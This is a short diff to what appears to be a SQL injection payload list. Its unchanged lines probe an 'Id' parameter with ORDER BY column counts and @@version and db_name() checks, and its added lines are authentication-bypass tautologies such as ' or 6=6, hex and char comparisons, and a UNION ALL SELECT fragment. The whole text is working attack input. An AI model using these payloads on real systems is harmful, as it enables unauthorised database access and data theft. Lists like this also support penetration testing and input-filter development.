@@ -14,3 +14,7 @@ order by 100--
 ?Id=7 and @@version=1--
 ?Id=7 and 1=db_name()--
 ?id=1-' order by 10--
+' or 6=6
+' or 0x47=0x47or char(32)=''
+or 6 is not null
+UNION ALL SELECT
